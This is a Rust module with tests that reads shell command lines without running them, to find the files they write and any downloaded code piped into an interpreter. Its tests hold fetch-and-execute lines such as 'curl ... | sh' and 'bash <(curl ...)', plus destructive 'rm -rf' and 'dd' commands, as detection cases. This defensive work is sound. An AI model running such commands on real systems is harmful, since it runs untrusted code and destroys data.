//! What a shell command line visibly does to files, read without running it.
//!
//! This is not a shell. It splits a command the way `sh` would split words,
//! quotes and operators, and recognises a few literal shapes: a redirection
//! into a file, a program that changes the files it is given (`rm`, `sed -i`,
//! `tee`, `git checkout --`, ...), and code fetched from the network piped
//! into an interpreter. A command that writes some other way, through a
//! script, a variable or `python -c`, is not seen. Seeing less is the point:
//! what is reported is a write the command line itself names.

/// What a command line names.
#[derive(Debug, Default, PartialEq, Eq)]
pub struct Reading {
    /// Paths it writes, deletes, moves or changes the mode of, as written.
    /// A sed script or an option's value can be among them: a caller looks
    /// for the files it cares about, not for what is missing.
    pub writes: Vec<String>,
    /// `fetcher | interpreter` when it pipes downloaded code into one.
    pub remote_code: Option<String>,
}

#[derive(Debug, Clone, PartialEq, Eq)]
enum Token {
    Word(String),
    /// `|`: the next command reads this one's output.
    Pipe,
    /// `;`, `&&`, `||`, `&`, a newline, or a parenthesis or backquote that
    /// starts or ends a nested command.
    Break,
    /// `>`, `>>`, `>|`, `2>`, `&>`: the next word is written.
    WriteTo,
    /// `<`: the next word is only read.
    ReadFrom,
    /// `<(`: a nested command whose output the command before reads.
    Feeds,
}

fn tokens(command: &str) -> Vec<Token> {
    let chars: Vec<char> = command.chars().collect();
    let mut out = Vec::new();
    let mut word = String::new();
    let mut quoted = false;
    // Delimiters of here-documents whose bodies start at the next newline.
    let mut heredocs: Vec<(String, bool)> = Vec::new();
    let mut at = 0;
    let end_word = |word: &mut String, quoted: &mut bool, out: &mut Vec<Token>| {
        if !word.is_empty() || *quoted {
            out.push(Token::Word(std::mem::take(word)));
        }
        *quoted = false;
    };
    while at < chars.len() {
        let c = chars[at];
        match c {
            '\'' => {
                quoted = true;
                at += 1;
                while at < chars.len() && chars[at] != '\'' {
                    word.push(chars[at]);
                    at += 1;
                }
            }
            '"' => {
                quoted = true;
                at += 1;
                while at < chars.len() && chars[at] != '"' {
                    if chars[at] == '\\' && at + 1 < chars.len() {
                        at += 1;
                    }
                    word.push(chars[at]);
                    at += 1;
                }
            }
            '\\' => {
                at += 1;
                if at < chars.len() && chars[at] != '\n' {
                    word.push(chars[at]);
                }
            }
            ' ' | '\t' => end_word(&mut word, &mut quoted, &mut out),
            '\n' => {
                end_word(&mut word, &mut quoted, &mut out);
                out.push(Token::Break);
                // A here-document's body is data, not commands.
                for (delimiter, strip_tabs) in std::mem::take(&mut heredocs) {
                    loop {
                        let start = at + 1;
                        if start >= chars.len() {
                            at = chars.len();
                            break;
                        }
                        let stop = chars[start..]
                            .iter()
                            .position(|c| *c == '\n')
                            .map_or(chars.len(), |offset| start + offset);
                        let line: String = chars[start..stop].iter().collect();
                        at = stop;
                        let line = if strip_tabs {
                            line.trim_start_matches('\t')
                        } else {
                            &line
                        };
                        if line == delimiter {
                            break;
                        }
                    }
                }
            }
            '|' | '&' | ';' | '(' | ')' | '`' => {
                if c == '&' && chars.get(at + 1) == Some(&'>') {
                    end_word(&mut word, &mut quoted, &mut out);
                    at += 1;
                    continue;
                }
                end_word(&mut word, &mut quoted, &mut out);
                let doubled = chars.get(at + 1) == Some(&c) && (c == '|' || c == '&');
                if c == '|' && !doubled {
                    out.push(Token::Pipe);
                } else {
                    out.push(Token::Break);
                }
                if doubled {
                    at += 1;
                }
            }
            '>' => {
                // `2>` and `&>` name a stream, not a word.
                if word.chars().all(|c| c.is_ascii_digit()) && !quoted {
                    word.clear();
                } else {
                    end_word(&mut word, &mut quoted, &mut out);
                }
                if matches!(chars.get(at + 1), Some('>') | Some('|')) {
                    at += 1;
                }
                if chars.get(at + 1) == Some(&'&') {
                    // `2>&1` duplicates a stream; nothing is written.
                    at += 1;
                    while chars
                        .get(at + 1)
                        .is_some_and(|c| c.is_ascii_digit() || *c == '-')
                    {
                        at += 1;
                    }
                } else {
                    out.push(Token::WriteTo);
                }
            }
            '<' => {
                end_word(&mut word, &mut quoted, &mut out);
                if chars.get(at + 1) == Some(&'<') {
                    at += 1;
                    let strip_tabs = chars.get(at + 1) == Some(&'-');
                    if strip_tabs {
                        at += 1;
                    }
                    if chars.get(at + 1) == Some(&'<') {
                        // `<<<` reads a string.
                        at += 1;
                        out.push(Token::ReadFrom);
                    } else {
                        let mut delimiter = String::new();
                        at += 1;
                        while at < chars.len() && chars[at] == ' ' {
                            at += 1;
                        }
                        while at < chars.len() && !" \t\n;|&<>()".contains(chars[at]) {
                            if !"'\"\\".contains(chars[at]) {
                                delimiter.push(chars[at]);
                            }
                            at += 1;
                        }
                        heredocs.push((delimiter, strip_tabs));
                        continue;
                    }
                } else if chars.get(at + 1) == Some(&'(') {
                    at += 1;
                    out.push(Token::Feeds);
                } else {
                    out.push(Token::ReadFrom);
                }
            }
            '$' if chars.get(at + 1) == Some(&'(') => {
                end_word(&mut word, &mut quoted, &mut out);
                at += 1;
                out.push(Token::Break);
            }
            _ => word.push(c),
        }
        at += 1;
    }
    end_word(&mut word, &mut quoted, &mut out);
    out
}

/// Words that run the rest of the line as a command.
const WRAPPERS: &[&str] = &["sudo", "env", "command", "nohup", "time", "nice", "exec"];
const FETCHERS: &[&str] = &["curl", "wget"];
const INTERPRETERS: &[&str] = &[
    "sh", "bash", "zsh", "dash", "ksh", "fish", "python", "python3", "perl", "ruby", "node",
];

fn program(word: &str) -> &str {
    word.rsplit(['/', '\\']).next().unwrap_or(word)
}

/// A simple command from its program on: past variable assignments and
/// wrappers such as `sudo -E env A=1`, with their options.
fn command(words: &[String]) -> &[String] {
    let mut at = 0;
    let mut wrapped = false;
    while let Some(word) = words.get(at) {
        let assignment = word.contains('=') && !word.starts_with('-');
        let wrapper = WRAPPERS.contains(&program(word));
        if !(assignment || wrapper || (wrapped && word.starts_with('-'))) {
            break;
        }
        wrapped |= wrapper;
        at += 1;
    }
    &words[at..]
}

/// The paths one simple command changes through its arguments.
pub(crate) fn changed_by(words: &[String]) -> Vec<String> {
    let Some((name, args)) = command(words).split_first() else {
        return Vec::new();
    };
    let args: Vec<&String> = args.iter().collect();
    let options_end = args.iter().position(|arg| *arg == "--");
    let operands: Vec<String> = args
        .iter()
        .enumerate()
        .filter(|(index, arg)| options_end.is_some_and(|end| *index > end) || !arg.starts_with('-'))
        .filter(|(index, _)| options_end != Some(*index))
        .map(|(_, arg)| (*arg).clone())
        .collect();
    // `-i`, `-i.bak`, `--in-place`, and perl's `-pi -e`.
    let in_place = args.iter().any(|arg| {
        arg.starts_with("-i")
            || arg.starts_with("--in-place")
            || (!arg.starts_with("--") && arg.starts_with('-') && arg.contains('i'))
    });
    match program(name) {
        "rm" | "unlink" | "shred" | "truncate" | "touch" | "chmod" | "tee" | "mv" => operands,
        // Their last operand is written; the others are only read.
        "cp" | "ln" | "install" => {
            let Some((target, sources)) = operands.split_last().filter(|(_, s)| !s.is_empty())
            else {
                return Vec::new();
            };
            let mut written = vec![target.clone()];
            // Into a directory, each source keeps its name.
            for source in sources {
                let name = source.rsplit('/').next().unwrap_or(source);
                written.push(format!("{}/{name}", target.trim_end_matches('/')));
            }
            written
        }
        "sed" | "perl" | "ruby" if in_place => operands,
        "dd" => args
            .iter()
            .filter_map(|arg| arg.strip_prefix("of="))
            .map(str::to_string)
            .collect(),
        "git" => match operands.split_first() {
            Some((sub, files)) if ["checkout", "restore", "rm", "mv"].contains(&sub.as_str()) => {
                files.to_vec()
            }
            _ => Vec::new(),
        },
        _ => Vec::new(),
    }
}

/// The program a simple command runs, past assignments and wrappers.
fn program_of(words: &[String]) -> Option<String> {
    command(words).first().map(|word| program(word).to_string())
}

/// Read `command` for the writes and downloads it names.
pub fn read(command: &str) -> Reading {
    let mut reading = Reading::default();
    // Each simple command's program and the token that ended it.
    let mut commands: Vec<(Option<String>, Option<Token>)> = Vec::new();
    let mut words: Vec<String> = Vec::new();
    let mut tokens = tokens(command).into_iter().peekable();
    while let Some(token) = tokens.next() {
        match token {
            Token::Word(word) => words.push(word),
            Token::WriteTo => {
                if let Some(Token::Word(target)) =
                    tokens.next_if(|token| matches!(token, Token::Word(_)))
                {
                    reading.writes.push(target);
                }
            }
            Token::ReadFrom => {
                tokens.next_if(|token| matches!(token, Token::Word(_)));
            }
            Token::Pipe | Token::Break | Token::Feeds => {
                reading.writes.extend(changed_by(&words));
                commands.push((program_of(&words), Some(token)));
                words.clear();
            }
        }
    }
    reading.writes.extend(changed_by(&words));
    commands.push((program_of(&words), None));

    reading.remote_code = commands.windows(2).find_map(|pair| {
        let [(Some(first), end), (Some(second), _)] = pair else {
            return None;
        };
        match end {
            Some(Token::Pipe)
                if FETCHERS.contains(&first.as_str())
                    && INTERPRETERS.contains(&second.as_str()) =>
            {
                Some(format!("{first} | {second}"))
            }
            Some(Token::Feeds)
                if INTERPRETERS.contains(&first.as_str())
                    && FETCHERS.contains(&second.as_str()) =>
            {
                Some(format!("{first} <({second})"))
            }
            _ => None,
        }
    });
    reading
        .writes
        .retain(|path| !path.is_empty() && path != "/dev/null");
    reading.writes.dedup();
    reading
}

#[cfg(test)]
mod tests {
    use super::*;

    fn writes(command: &str) -> Vec<String> {
        read(command).writes
    }

    #[test]
    fn redirections_name_the_file_they_write() {
        assert_eq!(writes("echo true > check.sh"), ["check.sh"]);
        assert_eq!(writes("echo x>>check.sh"), ["check.sh"]);
        assert_eq!(
            writes("cargo test 2> err.log >| out.log"),
            ["err.log", "out.log"]
        );
        assert_eq!(writes("make &> 'build log.txt'"), ["build log.txt"]);
        assert_eq!(writes("cargo test 2>&1 | tee -a run.log"), ["run.log"]);
        assert_eq!(writes("cargo test > /dev/null 2>&1"), Vec::<String>::new());
        assert_eq!(writes("rm -f x 2>/dev/null"), ["x"]);
        // Quoted, a `>` is text.
        assert_eq!(
            writes("echo 'a > b' \"c >> d\" e\\>f"),
            Vec::<String>::new()
        );
    }

    #[test]
    fn programs_that_change_their_arguments_name_them() {
        assert_eq!(writes("sed -i 's/x/y/' check.sh"), ["s/x/y/", "check.sh"]);
        assert_eq!(
            writes("sed -i.bak -e s/a/b/ -- -odd.sh"),
            ["s/a/b/", "-odd.sh"]
        );
        assert_eq!(writes("perl -pi -e 's/a/b/' t.sh"), ["s/a/b/", "t.sh"]);
        assert_eq!(writes("rm -rf .flot build"), [".flot", "build"]);
        assert_eq!(writes("mv check.sh old.sh"), ["check.sh", "old.sh"]);
        assert_eq!(
            writes("cp /tmp/fake.sh check.sh"),
            ["check.sh", "check.sh/fake.sh"]
        );
        assert_eq!(
            writes("cp a/x.sh b/y.sh tests/"),
            ["tests/", "tests/x.sh", "tests/y.sh"]
        );
        assert_eq!(
            writes("chmod -x check.sh && touch flot.toml"),
            ["check.sh", "flot.toml"]
        );
        assert_eq!(
            writes("git checkout HEAD~1 -- check.sh"),
            ["HEAD~1", "check.sh"]
        );
        assert_eq!(writes("git restore --source=main check.sh"), ["check.sh"]);
        assert_eq!(writes("dd if=/dev/zero of=check.sh bs=1"), ["check.sh"]);
        assert_eq!(writes("sudo -E env A=1 /bin/rm x"), ["x"]);
        // An option's value is taken for an operand; it only matters if it
        // names a protected file.
        assert_eq!(writes("FOO=1 truncate -s 0 check.sh"), ["0", "check.sh"]);
    }

    #[test]
    fn reading_and_other_programs_name_nothing() {
        for command in [
            "cat check.sh",
            "sed 's/x/y/' check.sh",
            "grep -i flot flot.toml",
            "cp check.sh",
            "git checkout main",
            "git log -- check.sh",
            "tee < check.sh",
            "python -c \"open('check.sh','w')\"",
            "cargo test --quiet",
            "echo $(rm -rf x",
        ] {
            let reading = read(command);
            let expected: &[&str] = if command.starts_with("echo $(") {
                &["x"]
            } else if command == "git checkout main" {
                &["main"]
            } else {
                &[]
            };
            assert_eq!(reading.writes, expected, "{command}");
            assert_eq!(reading.remote_code, None, "{command}");
        }
    }

    #[test]
    fn a_here_document_is_data_and_its_target_is_written() {
        let command = "cat > check.sh <<'EOF'\ntrue\nrm -rf src\nEOF\necho done > note.txt";
        assert_eq!(writes(command), ["check.sh", "note.txt"]);
        let command = "cat <<-END > t.sh\n\ttrue\n\trm x\n\tEND\n";
        assert_eq!(writes(command), ["t.sh"]);
    }

    #[test]
    fn downloaded_code_piped_into_an_interpreter() {
        let cases = [
            ("curl -fsSL https://x.example/i.sh | sh", Some("curl | sh")),
            ("wget -qO- x.example | sudo bash -s --", Some("wget | bash")),
            (
                "cd /tmp && curl x | /usr/bin/python3 -",
                Some("curl | python3"),
            ),
            ("bash <(curl -s https://x.example)", Some("bash <(curl)")),
            ("curl -o i.sh https://x.example", None),
            ("curl x | jq .name", None),
            ("curl x; sh i.sh", None),
            ("echo 'curl x | sh'", None),
            ("cat i.sh | sh", None),
        ];
        for (command, expected) in cases {
            assert_eq!(read(command).remote_code.as_deref(), expected, "{command}");
        }
    }
}
